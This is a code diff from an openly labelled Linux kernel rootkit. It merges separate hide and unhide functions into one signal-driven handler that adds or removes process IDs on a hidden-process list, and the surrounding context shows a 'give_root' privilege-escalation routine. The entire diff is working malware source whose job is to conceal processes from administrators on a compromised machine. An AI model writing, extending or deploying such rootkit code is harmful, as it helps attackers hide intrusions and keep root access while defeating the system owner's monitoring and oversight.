@@ -85,49 +85,47 @@ long give_root(const pid_t i32_pid, const int i32_sig)
     return 0;
 }
 
-long hide_process(const pid_t i32_pid, const int i32_sig)
-{
-    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
-    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
-
-    if (i32_real_pid == -1) {
-        return -EPERM;
-    }
-
-    pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);
-
-    p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
-    IF_U (p_hidden_pid == NULL) {
-        pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
-        return -EPERM;
-    }
-
-    // Add the given PID to the list (if it is 0, add the current PID)
-    p_hidden_pid->i32_pid = i32_real_pid;
-
-    list_add(&p_hidden_pid->list, &hidden_pids_list);
-
-    return 0;
-}
-
-long show_process(const pid_t i32_pid, const int i32_sig)
+long show_hide_process(const pid_t i32_pid, const int i32_sig)
 {
     hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
     hidden_pid_t *p_tmp        = NULL;                       // Temporary pointer for iteration
     const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
 
-    if (i32_real_pid == -1) {
+    IF_U (i32_real_pid == -1) {
         return -EPERM;
     }
 
-    pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);
+    switch (i32_sig) {
+    case SIGHIDE:
+        pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);
 
-    // Remove the given PID from the hidden list (if it is 0, remove the current PID)
-    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
-        if (p_hidden_pid->i32_pid == i32_real_pid) {
-            list_del(&p_hidden_pid->list);
-            kfree(p_hidden_pid);
+        p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
+        IF_U (p_hidden_pid == NULL) {
+            pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
+            return -EPERM;
         }
+
+        // Add the given PID to the list (if it is 0, add the current PID)
+        p_hidden_pid->i32_pid = i32_real_pid;
+
+        list_add(&p_hidden_pid->list, &hidden_pids_list);
+        break;
+
+    case SIGSHOW:
+        pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);
+
+        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
+        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
+            if (p_hidden_pid->i32_pid == i32_real_pid) {
+                list_del(&p_hidden_pid->list);
+                kfree(p_hidden_pid);
+            }
+        }
+        break;
+
+    default:
+        pr_err("[ROOTKIT] * show_hide_process(): Invalid signal: %d\n", i32_sig);
+        return -EINVAL;
     }
 
     return 0;
